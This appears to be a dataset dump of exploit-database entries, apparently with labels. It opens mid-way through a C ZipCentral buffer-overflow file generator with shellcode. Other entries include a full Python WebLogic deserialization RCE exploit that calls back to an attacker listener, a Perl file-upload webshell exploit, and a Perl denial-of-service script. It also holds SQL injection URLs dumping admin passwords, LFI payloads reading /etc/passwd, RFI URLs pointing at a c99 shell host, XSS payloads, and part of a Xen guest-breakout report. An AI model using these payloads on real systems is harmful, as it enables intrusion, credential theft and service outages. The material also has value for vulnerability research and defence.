""\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00"" 			 ""\xB7\xAC\xCE\x34\x00\x00\x00\x00\x00\x00"" 			 ""\x00\x00\x00\x00\x00\x00\x14\x08\x00""; char middle[] = ""\x2e\x74\x78\x74\x50\x4B\x01\x02\x14\x00"" 				""\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34"" 				""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" 				""\x00\x00\x14\x08\x00\x00\x00\x00\x00\x00"" 				""\x01\x00\x24\x00\x00\x00\x00\x00\x00""; char tail[] = ""\x2e\x74\x78\x74\x50\x4B\x05\x06\x00\x00"" 			 ""\x00\x00\x01\x00\x01\x00\x42\x08\x00\x00"" 			 ""\x32\x08\x00\x00\x00"";  int main(int argc,char *argv[]) { 	char overflow[657]; // is 657 bytes big enough for a filename? 	char overflow2[1407]; FILE *vuln; if(argc == 1) {     printf(""ZipCentral 4.01 Buffer Overflow Exploit.\n"");     printf(""Coded by bratax (http://www.bratax.be/).\n"");     printf(""Usage: %s <outputfile>\n"",argv[0]);     return 0; } vuln = fopen(argv[1],""w"");  //build overflow buffer here. memset(overflow,0x41,sizeof(overflow)); //fill with crap memcpy(overflow+2, scode, 483); // our shellcode memcpy(overflow+653, ""\x82\x6E\xEC\x98"", 4); // jmp back to shellcode memset(overflow2, 0x42, sizeof(overflow2)); // more crap memcpy(overflow2+0,""\x98\x85\x8E\x00"", 4); // pop pop ret // pop pop ret somewhere within 0x00xxxxFF.. needed because of 2 reasons // which I'm not going to explain here right now.. // notice that 008E8598 will be changed in memory and will become 00C4E0FF // this might be different on other machines, but will always be 00xxE0FF   if(vuln) {     //Write file     fwrite(head, 1, sizeof(head), vuln);     fwrite(overflow, 1, sizeof(overflow), vuln);     fwrite(overflow2, 1, sizeof(overflow2), vuln);     fwrite(middle, 1, sizeof(middle), vuln);     fwrite(overflow, 1, sizeof(overflow), vuln);     fwrite(overflow2, 1, sizeof(overflow2), vuln);     fwrite(tail, 1, sizeof(tail), vuln);     fclose(vuln); } printf(""File written.\nOpen with ZipCentral 4.01 to exploit.\n""); return 0; }  // milw0rm.com [2006-08-30]","[""'.ZIP'""]",1
8032,"Potato News 1.0.0 - Local File Inclusion ######################################################################################### [0x01] Informations:  Name           : Potato News 1.0.0 Download       : http://potato-news.googlecode.com/files/potatonews-1.0.0.zip Vulnerability  : LFI Author         : x0r Contact        : andry2000@hotmail.it Notes          : Proud to be Italian ######################################################################################### [0x02] Bug:  Bugged file is /[path]/admin.php  [Code] 	<?PHP if (isset($_COOKIE[""user""])) { $id = $_COOKIE[""user""]; if (file_exists(""data/users/$id.php"")) { include (""data/users/$id.php""); if ($usaavatar == """") { echo ""<img height='75px' width='75px' src='images/noav.jpg'/>"";  } else { echo ""<img height='75px' width='75px' src='$usaavatar'/>""; } } [/code]  ######################################################################################### [0x03] Exploit:  Exploit: javascript:document.cookie = ""user=../../../../../../../../../../etc/passwd%00; path=/""  ########################################################################################  # milw0rm.com [2009-02-10]",['admin.php '],1
21901,"MySimpleNews 1.0 - Remote Readable Administrator Password source: https://www.securityfocus.com/bid/5866/info  MySimpleNews stores the administrative password in clear text in a remotely viewable HTML file.  Any remote user can view the contents of the HTML file to determine the administrator password.  The administrator password can be found in the HTML code for admin.html below: moncode = prompt('MySimpleNews - Administration',''); if (moncode != ""[ADMINPASSWORD]"") { location.href=""about:Erreur 403""; }",['admin.html '],1
44998,"Oracle WebLogic 12.1.2.0 - RMI Registry UnicastRef Object Java Deserialization Remote Code Execution #!/usr/bin/python # -*- coding: utf-8 -*-  from argparse import RawTextHelpFormatter import socket, argparse, subprocess, ssl, os.path  HELP_MESSAGE = ''' -------------------------------------------------------------------------------------- Developped by bobsecq: quentin.hardy@protonmail.com (quentin.hardy@bt.com)  This script is the first public exploit/POC for: - Exploiting CVE-2017-3248 (Oracle WebLogic RMI Registry UnicastRef Object Java Deserialization Remote Code Execution) - Checking if a weblogic server is vulnerable  This script needs the last version of Ysoserial (https://github.com/frohoff/ysoserial)  Version affected (according to Oracle): - 10.3.6.0 - 12.1.3.0 - 12.2.1.0 - 12.2.1.1 -------------------------------------------------------------------------------------- ''' ''' Tested on 12.1.2.0  For technical information, see: - https://www.tenable.com/security/research/tra-2017-07 - http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html  Vulnerability identified by Jacob Baines (Tenable Network Security) but exploit/POC has not been published! '''  #COMMANDS ARGS_YSO_GET_PAYLOD = ""JRMPClient {0}:{1} |xxd -p| tr -d '\n'"" #{0}: IP, {1}: port for connecting 'back' (i.e. attacker IP) CMD_GET_JRMPCLIENT_PAYLOAD = ""java -jar {0} {1}""# {0} YSOSERIAL_PATH, {1}ARGS_YSO_GET_PAYLOD CMD_YSO_LISTEN = ""java -cp {0} ysoserial.exploit.JRMPListener {1} {2} '{3}'""# {0} YSOSERIAL_PATH, {1}PORT, {2}payloadType, {3}command  #PAYLOADS #A. Packet 1 to send: payload_1 = '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a' #B. Packet 2 to send: payload_2 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e32323700124141414141414141414141413154362e656883348cd60000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd071a7727000d3131312e3131312e302e31313161863d1d0000000078' #C. Packet 3 to send: #C.1 length payload_3_1 = ""000003b3"" #C.2 first part payload_3_2 = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000' #C.3.1 sub payload payload_3_3_1 = 'aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' #C.3.2 Ysoserial Payload generated in real time payload_3_3_2 = """" #C.4 End of the payload payload_3_4 = 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'  def runCmd(cmd): 	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 	stdout_value = proc.stdout.read() + proc.stderr.read() 	return stdout_value  def getJrmpClientPayloadEncoded(attackerIp, attackerJRMPListenerPort, ysoPath): 	completeCmd = CMD_GET_JRMPCLIENT_PAYLOAD.format(ysoPath, ARGS_YSO_GET_PAYLOD.format(attackerIp, attackerJRMPListenerPort)) 	print ""[+] Ysoserial command (JRMP client): {0}"".format(repr(completeCmd)) 	stdout = runCmd(cmd = completeCmd) 	return stdout  def exploit(targetIP, targetPort, attackerIP, attackerJRMPPort, cmd, testOnly=False, payloadType='CommonsCollections5', sslEnabled=False, ysoPath=""""): 	if testOnly == True: 		attackerIP = ""127.0.0.1"" 		attackerJRMPPort = 0 	print ""[+] Connecting to {0}:{1} ..."".format(targetIP, targetPort) 	if sslEnabled == True: 		print ""[+] ssl mode enabled"" 		s = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) 	else: 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 		print ""[+] ssl mode disabled"" 	s.connect((targetIP, targetPort)) 	print ""[+] Connected to {0}:{1}"".format(targetIP, targetPort) 	print ""[+] Sending first packet..."" 	#print ""[S1] Sending {0}"".format(repr(payload_1.decode('hex'))) 	s.sendall(payload_1.decode('hex')) 	data = s.recv(4096) 	#print '[R1] Received', repr(data) 	print ""[+] Sending second packet..."" 	#print ""[S2] Sending {0}"".format(repr(payload_2.decode('hex'))) 	s.sendall(payload_2.decode('hex')) 	data = s.recv(4096) 	#print '[R2] Received', repr(data) 	print ""[+] Generating with ysoserial the third packet which contains a JRMPClient payload..."" 	payload_3_3_2 = getJrmpClientPayloadEncoded(attackerIp=attackerIP, attackerJRMPListenerPort=attackerJRMPPort, ysoPath=ysoPath) 	payload= payload_3_1 + payload_3_2 + payload_3_3_1 + payload_3_3_2 + payload_3_4 	payload = payload.replace(payload_3_1, ""0000{:04x}"".format(len(payload)/2), 1) 	sendata = payload.decode('hex') 	if testOnly == False: 		print ""[+] You have to execute the following command locally:"" 		print ""    {0}"".format(CMD_YSO_LISTEN.format(ysoPath, attackerJRMPPort, payloadType,cmd)) 		raw_input(""[+] Press Enter when this previous command is running..."") 	print ""[+] Sending third packet..."" 	#print ""[S3] Sending {0}"".format(repr(sendata)) 	s.sendall(sendata) 	data = s.recv(4096) 	s.close() 	#print '[R3] Received', repr(data) 	if testOnly == True: 		if ""cannot be cast to weblogic"" in str(data): 			print ""[+] 'cannot be cast to weblogic' string in the third response from server"" 			print ""\n{2}\n[-] target {0}:{1} is not vulnerable\n{2}\n"".format(targetIP, targetPort, '-'*60) 		else: 			print ""[+] 'cannot be cast to weblogic' string is NOT in the third response from server"" 			print ""\n{2}\n[+] target {0}:{1} is vulnerable\n{2}\n"".format(targetIP, targetPort, '-'*60) 	else: 		print ""[+] The target will connect to {0}:{1}"".format(attackerIP, attackerJRMPPort) 		print ""[+] The command should be executed on the target after connection on {0}:{1}"".format(attackerIP, attackerJRMPPort)  def main(): 	argsParsed = argparse.ArgumentParser(description=HELP_MESSAGE, formatter_class=RawTextHelpFormatter) 	argsParsed.add_argument(""-t"", dest='target', required=True, help='target IP') 	argsParsed.add_argument(""-p"", dest='port', type=int, required=True, help='target port') 	argsParsed.add_argument(""--jip"", dest='attackerIP', required=False, help='Local JRMP listener ip') 	argsParsed.add_argument(""--jport"", dest='attackerPort', type=int, default=3412, required=False, help='Local JRMP listener port (default: %(default)s)') 	argsParsed.add_argument(""--cmd"", dest='cmdToExecute', help='Command to execute on the target') 	argsParsed.add_argument(""--check"", dest='check', action='store_true', default=False, help='Check if vulnerable') 	argsParsed.add_argument(""--ssl"", dest='sslEnabled', action='store_true', default=False, help='Enable ssl connection') 	argsParsed.add_argument(""--ysopath"", dest='ysoPath', required=True, default=False, help='Ysoserial path') 	argsParsed.add_argument(""--payloadType"", dest='payloadType', default=""CommonsCollections5"", help='Payload to use in JRMP listener (default: %(default)s)') 	args = dict(argsParsed.parse_args()._get_kwargs()) 	if os.path.isfile(args['ysoPath'])==False: 		print ""[-] You have to give the path to Ysoserial with --ysopath (https://github.com/frohoff/ysoserial)!"" 		return -1 	if args['check'] == False and args['attackerIP'] == None: 		print ""[-] You have to give an IP with --jip !"" 		return -1 	elif args['check'] == False and args['cmdToExecute'] == None: 		print ""[-] You have to give a command to execute on the target with --cmd !"" 		return -1 	if args['check'] == True: 		print ""[+] Checking if target {0}:{1} is vulnerable to CVE-2017-3248 without executing a system command on the target..."".format(args['target'], args['port']) 		exploit(targetIP=args['target'], targetPort=args['port'], attackerIP=None, attackerJRMPPort=None, cmd=None, testOnly=True, sslEnabled=args['sslEnabled'], ysoPath=args['ysoPath']) 	else: 		print ""[+] Exploiting  target {0}:{1}..."".format(args['target'], args['port']) 		exploit(targetIP=args['target'], targetPort=args['port'], attackerIP=args['attackerIP'], attackerJRMPPort=args['attackerPort'], cmd=args['cmdToExecute'], payloadType=args['payloadType'], testOnly=False, sslEnabled=args['sslEnabled'],ysoPath=args['ysoPath'])  if __name__ == ""__main__"": 	main()","['RMI Registry', 'Object']",1
31771,cPanel 11.x - '/scripts2/knowlegebase?issue' Cross-Site Scripting source: https://www.securityfocus.com/bid/29125/info  cPanel is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/scripts2/knowlegebase?issue=[INJECTION]&domain=,"[""'/scripts2/knowlegebase?issue'""]",1
46500,"OpenDocMan 1.3.4 - 'search.php where' SQL Injection =========================================================================================== # Exploit Title: OpenDocMan 1.3.4 - ’where’ SQL Injection # CVE: N/A # Date: 05/03/2019 # Exploit Author: Mehmet EMIROGLU # Vendor Homepage: https://sourceforge.net/projects/opendocman/files/ # Software Link: https://sourceforge.net/projects/opendocman/files/ # Version: v1.3.4 # Category: Webapps # Tested on: Wamp64, @Win # Software description: OpenDocMan is a web based document management system (DMS) written in PHP designed   to comply with ISO 17025 and OIE standard for document management.   It features fine grained control of access to files, and automated install and upgrades. =========================================================================================== # POC - SQLi # Parameters : where # Attack Pattern : %2527 # GET Request : http://localhost/opendocman/search.php?submit=submit&sort_by=id&where=[SQL Inject Here]&sort_order=asc&keyword=Training Manual&exact_phrase=on ===========================================================================================","[""'search.php where'""]",1
5174,"Quantum Game Library 0.7.2c - Remote File Inclusion # Name : Quantum Game Library 0.7.2c Multiple Remote File Include # Download From : http://garr.dl.sourceforge.net/sourceforge/quantumstar/qsgen_0.7.2c.zip # Found By : RoMaNcYxHaCkEr     [RoMaNTiC-TeaM]           # Home Page :  WwW.4RxH.CoM   +============================================================================+ # Vulne Code In Files server_request.php & smarty.inc.php In Line 2 & 1 : require_once($CONFIG['gameroot'].""/qlib/config/config.inc.php""); require_once($CONFIG['gameroot'].""/qlib/smarty/libs/Smarty.class.php""); # Exploit : http://www.4rxh.com/qsgen_0.7.2c/server_request.php?CONFIG[gameroot]=http://rxh.freehostia.com/shells/c99in.txt? http://www.4rxh.com/qsgen_0.7.2c/qlib/smarty.inc.php?CONFIG[gameroot]=http://rxh.freehostia.com/shells/c99in.txt? That,s It,s Good Luck Everybody +============================================================================+ # Greet To : Tryag TeaM & All Members Of My Forum # For Contact : RxH@HotMail.iT # Note : Yesterday I Help You !! Tomorrow Fuck Me !!! Fuck All Snitches !!! But Do You Know What !!! That,s Is My Mistake Best Wishes  # milw0rm.com [2008-02-22]",['request.php '],1
28520,Ractive Popper 1.41 - 'Childwindow.Inc.php' Remote File Inclusion source: https://www.securityfocus.com/bid/19972/info  Ractive Popper is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue could allow an attacker to compromise the application and the underlying system; other attacks are also possible.  Version 1.41-r2 and prior are affected by this issue.  http://www.example.com/[Script Path]/childwindow.inc.php?form=http://SHELLURL.COM?&cmd=id,"[""'Childwindow.Inc.php'""]",1
7528,"OneOrZero helpdesk 1.6.x. - Arbitrary File Upload #!/usr/bin/perl =about   OneOrZero 1.6.* Perl exploit   AUTHOR  	discovered & written by Ams 	ax330d [doggy] gmail [dot] com   VULN. DESCRIPTION: 	In 'tinfo.php' script there are function 	named uploadAttachment() through which 	we are able to upload files. 	It does not checks what the file 	is uploaded.   EXPLOIT WORK: 	First of all it uploads small shell, 	then, due to unknown shell name, 	it bruteforces it. 	(Uploaded shell name is concatenation  	of original filename,  	unix timestamp and substracted 	microseconds from time.) 	Then it uploads new shell through  	small shell. 	(Script saves to DB what has been uploaded, 	but if magic_quotes_gpc=off exploit 	will disable this logging via SQl-inj.)   REQUIREMENTS: 	Upload must be allowed.    PS: 	With register_globals=on there are even more 	vulnerabilities, starting from LFI till  	remote code execution.  =cut  use strict; use warnings;  use LWP::UserAgent; use HTTP::Request::Common;  $| = 1; &banner;  my $expl_url = shift or &usage; my $tshell2  = shift; &usage unless -f $tshell2;  my $tshell = q(<?php move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name'])?print('ok1'):0;?>); my $spider = LWP::UserAgent->new;  $spider->timeout(9); $spider->max_redirect(0); $spider->agent('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');  exploit($expl_url);  sub exploit {          $_ = shift;      	my($prot, $host, $path, ) = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};     print ""\n\tExploiting: $prot://$host$path\n""; 	     my $req         = POST ""$prot://$host$path/tinfo.php?id=999999"",         Content_Type => 'form-data',         Content      => [send_mail    => 1, 						 SelectedFile => [ undef, 'by441e.php', 'Content_Type' => '\' text', 'Content' => $tshell ] 						]; 	 	my $start_time = time(); 	     my $res = $spider->request($req);     if (!$res->is_success) {         print ""\tFailure...\n"" . $res->status_line . ""\n"";         return 0;     }      	if ($res->content !~ /by441e\.php/) { 		print ""\tFailure...\n""; 		return 0; 	} else { 		print ""\n\tTest shell uploaded""; 	}      my $finish_time = time();          print ""\n\tStarting bruteforce (start:${start_time}000 finish:${start_time}999)\n"";          for my $sec ($start_time .. $finish_time) {         for my $micro ('000' .. '999') { 			             print ""\t$prot://$host$path/attachments/$sec${micro}_by441e.php\r"";             $res = $spider->request(HEAD ""$prot://$host$path/attachments/$sec${micro}_by441e.php""); 			             if ($res->status_line =~ /200/) {                 print ""\n\tFound one of shells...""; 				if (reload(""$prot://$host$path/attachments/$sec${micro}_by441e.php"")) { 					print ""\tShell: $prot://$host$path/attachments/sha.php\n""; 				}                 return;             }         }     } 	     print ""\n\tCould not find shell...\n""; }  sub reload { 	 	my $addr = shift;     my $req         = POST $addr,         Content_Type => 'form-data',         Content      => [ f => [ $tshell2, 'sha.php']]; 	my $res = $spider->request($req); 	 	if ($res->content =~ /ok1/) { 		print ""new shell uploaded!\n""; 		return 1; 	} else { 		print ""could not upload new shell.\n""; 		return 0; 	} }  sub usage {      	print "" 	Provide url and shell what to upload. 	Usage: 		perl $0 http://example.com localshell.php  ""; 	exit; }  sub banner {          print "" 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 	  OneOrZero 1.6.* exploit 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 	""; }  # milw0rm.com [2008-12-19]","[""tinfo.php'"", 'by441e.php\\']",1
5341,"Noticeware Email Server 4.6.1.0 - Denial of Service #NoticeWare Email Server  #Application:	Noticeware Email Server #Version: 	4.6.1.0 (NoticeWare Email Server) #Bugs:		Denial Of Service/ Remote Crash #Exploitation:	Remote #Date:		1st April 2008 #Author:		Ray #Email:		native19@gmail.com #Platforms:	Tested on XP/2003 #Taken from :	http://www.noticeware.com/noticemail.htm  #""The NoticeWareÂ™ Email Server NG is a high performance, multi-threaded email server for Windows #2000/2003/XP/Vista which supports IMAP/POP3 and SMTP protocols. Whether you are hosting your own email or #collecting mail from your ISP, the NoticeWareÂ™ Email Server will provide everything you need to run a #secure and dependable email system. Ideal for any size of business."" ##########################################################################################################  #1) Denial Of Service  #Denial of service occurs when the mailserver.exe crashes after receiving huge number of characters in #IMAP port 143 [ECX =0000000,DL = ??] , the admin application will still be running but if user clicked #on Send/Receive or any other buttons the application will crash .  ##########################################################################################################  #A Simple POC by Ray, dont forget to change the host address  use IO::Socket; print ""\n++ NoticeWare DOS""; print ""\n++ Initiating""; my $sock = new IO::Socket::INET ( 				  PeerAddr => '192.168.2.7', 				  PeerPort => '143', 				  Proto => 'TCP', 				  ); die ""Could not initiate connection $!\n"" unless $sock;  print $sock ""A"" x 9000 . ""\n""; print ""\n++ Have to wait for a few seconds before closing the socket""; sleep(6); close ($sock); print ""\n++ NC and check if the victim is killed \r\n"";  # milw0rm.com [2008-04-01]",['NoticeWareÂ™'],1
15588,"S_CMS 2.5 - Multiple Vulnerabilities # ============================================================ # Exploit Title: S-CMS Multiple Vuln # Date: 14/11/2010 # Author: LordTittiS # Greetings To: God_Of_Pain, System_Overide # Software Link: http://www.matteoiammarrone.com # http://www.matteoiammarrone.com/public/s-cms/ # Vulnerability Type: Full Path Disclosure / SQL Injection / Cross Site Scripting # Version: 2.5 # ===========================================================  -Vulnerability Details:The vulnerability is in the file search.php, the variable search_app is vulnerable.An attacker can exploit this to find out the rootpath of website or for SQLi attack. -Google Dork: inurl:viewforum.php?id= S-Cms -Exploit:  http://server/s-cms/viewforum.php?id='1 (FPD)  http://server/s-cms/viewforum.php?id=1+union+select+1,2,group_concat(username,0x3a,password),4,5,6,7+from+cms_users-- (SQLi) http://server/s-cms/viewforum.php?id='1%3E%22%3Cscript%3Ealert(document.cookie)%3C/script%3E (XSS)","['search.php,', 'viewforum.php?']",1
36551,PHP Ringtone Website - 'ringtones.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/51418/info  PHP Ringtone Website is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/[path]/ringtones.php?mmchar0_1=[xss]&mmstart0_1=1&mmsection0_1=[xss],"[""'ringtones.php'""]",1
6545,"HotScripts Clone - 'cid' SQL Injection |___________________________________________________| | | Hotscripts Clone (cid) Remote SQL Injection Vulnerability | |___________________________________________________ |---------------------Hussin X----------------------| | |    Author: Hussin X | |    Home :  WwW.IQ-ty.CoM |  WwW.TrYaG.CC | |    email:  darkangel_g85[at]Yahoo[DoT]com | | | |___________________________________________________ |                                                   | | | script : http://www.greatclone.com/product_info.php?cPath=31&products_id=81 | | DorK   : inurl:add_soft.php |___________________________________________________|   sbwmd_config:username_len sbwmd_email_id:useremail sbwmd_mailing_list:username sbwmd_mailing_list:useremail sbwmd_members:username sbwmd_admin:pwd>freemagics sbwmd_config:pwd_len sbwmd_members:pwd sbwmd_admin:admin_name sbwmd_config:admin_email sbwmd_softwares:admin_desc      www.[target].com/Script/showcategory.php?cid=-27+UNION+SELECT+1,concat(admin_name,0x3a,pwd),3,4,5,6+FROM+sbwmd_admin--   OR   www.[target].com/Script/showcategory.php?cid=-27+UNION+SELECT+1,concat(admin_name,0x3a,pwd),3,4,5+FROM+sbwmd_admin--       ____________________________( Greetz )_________________________________ | |    All members of the Forum WwW.IQ-ty.CoM |  WwW.TrYaG.CC | | |  My friends : DeViL iRaQ | IRAQ DiveR | IRAQ_JAGUR | CraCkEr | |    Ghost Hacker | FAHD | Iraqihack | jiko | str0ke | Cyber-Zone |______________________________________________________________________                                Im IRAQi  # milw0rm.com [2008-09-24]","[""'cid'""]",1
6547,"Ol BookMarks Manager 0.7.5 - Local File Inclusion / Remote File Inclusion / SQL Injection ######################################### Ol Bookmarks Manager 0.7.5 RFI / LFI / SQL Injection Vulnerabilities ######################################### POC & Vulns RFI In (frame.php) In Line 46 	include ""$_GET[framefile]""; ######################################### Ex : /frame.php?framefile=[Shell] ######################################### LFI In (/read/frame.php) In Line 46 	include ""../$_GET[framefile]""; ######################################### Ex : /frame.php?framefile=../../../../../../etc/passwd ######################################### SQL Injection In /read/index.php?name=brian&id= Ex : /read/index.php?name=brian&id=-0000008+union+select+1,2,3,4,password,login,7,8,9,10,12,11,13+from+preferences-- ######################################### Thanx To .. Tryag.cc/cc ..And.. All Members In TryaG   # milw0rm.com [2008-09-24]","['frame.php)', 'index.php?']",1
1800,"ScozNews 1.2.1 - 'mainpath' Remote File Inclusion ################ DEVIL TEAM THE BEST POLISH TEAM ################# #ScozNews v1.2.1 - Remote File Include #Find by Kacper (Rahim). #Greetings For ALL DEVIL TEAM members, Special DragonHeart :*** #Contact: kacper1964@yahoo.pl   or   http://www.devilteam.yum.pl #dork: ""(Powered By ScozNews)"" ##################################################################  http://www.site.com/[news_path]/sources/functions.php?CONFIG[main_path]=[evil_scripts]   http://www.site.com/[news_path]/sources/template.php?CONFIG[main_path]=[evil_scripts]   http://www.site.com/[news_path]/sources/news.php?CONFIG[main_path]=[evil_scripts]  http://www.site.com/[news_path]/sources/help.php?CONFIG[main_path]=[evil_scripts]  http://www.site.com/[news_path]/sources/mail.php?CONFIG[main_path]=[evil_scripts]  http://www.site.com/[news_path]/sources/Admin/admin_cats.php?CONFIG[main_path]=[evil_scripts]  http://www.site.com/[news_path]/sources/Admin/admin_edit.php?CONFIG[main_path]=[evil_scripts]  http://www.site.com/[news_path]/sources/Admin/admin_import.php?CONFIG[main_path]=[evil_scripts]  http://www.site.com/[news_path]/sources/Admin/admin_templates.php?CONFIG[main_path]=[evil_scripts]  ################################################################### #Elo ;-)  # milw0rm.com [2006-05-17]","[""'mainpath'""]",1
41870,"Xen - Broken Check in 'memory_exchange()' Permits PV Guest Breakout Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1184  This bug report describes a vulnerability in memory_exchange() that permits PV guest kernels to write to an arbitrary virtual address with hypervisor privileges. The vulnerability was introduced through a broken fix for CVE-2012-5513 / XSA-29.  The fix for CVE-2012-5513 / XSA-29 introduced the following check in the memory_exchange() hypercall handler:      if ( !guest_handle_okay(exch.in.extent_start, exch.in.nr_extents) ||          !guest_handle_okay(exch.out.extent_start, exch.out.nr_extents) )     {         rc = -EFAULT;         goto fail_early;     }  guest_handle_okay() calls array_access_ok(), which calls access_ok(), which is implemented as follows:      /*      * Valid if in +ve half of 48-bit address space, or above      * Xen-reserved area.      * This is also valid for range checks (addr, addr+size). As long      * as the start address is outside the Xen-reserved area then we      * will access a non-canonical address (and thus fault) before      * ever reaching VIRT_START.      */     #define __addr_ok(addr) \         (((unsigned long)(addr) < (1UL<<47)) || \          ((unsigned long)(addr) >= HYPERVISOR_VIRT_END))      #define access_ok(addr, size) \         (__addr_ok(addr) || is_compat_arg_xlat_range(addr, size))  As the comment states, access_ok() only checks the address, not the size, if the address points to guest memory, based on the assumption that any caller of access_ok() will access guest memory linearly, starting at the supplied address. Callers that want to access a subrange of the memory referenced by a guest handle are supposed to use guest_handle_subrange_okay(), which takes an additional start offset parameter, instead of guest_handle_okay().  memory_exchange() uses guest_handle_okay(), but only accesses the guest memory arrays referenced by exch.in.extent_start and exch.out.extent_start starting at exch.nr_exchanged, a 64-bit offset. The intent behind exch.nr_exchanged is that guests always set it to 0 and nonzero values are only set when a hypercall has to be restarted because of preemption, but this isn't enforced.  Therefore, by invoking this hypercall with crafted arguments, it is possible to write to an arbitrary memory location that is encoded as      exch.out.extent_start + 8 * exch.nr_exchanged  where exch.out.extent_start points to guest memory and exch.nr_exchanged is an attacker-chosen 64-bit value.   I have attached a proof of concept. This PoC demonstrates the issue by overwriting the first 8 bytes of the IDT entry for #PF, causing the next pagefault to doublefault. To run the PoC, unpack it in a normal 64-bit PV domain and run the following commands in the domain as root:  root@pv-guest:~# cd crashpoc root@pv-guest:~/crashpoc# make -C /lib/modules/$(uname -r)/build M=$(pwd) make: Entering directory '/usr/src/linux-headers-4.4.0-66-generic'   LD      /root/crashpoc/built-in.o   CC [M]  /root/crashpoc/module.o nasm -f elf64 -o /root/crashpoc/native.o 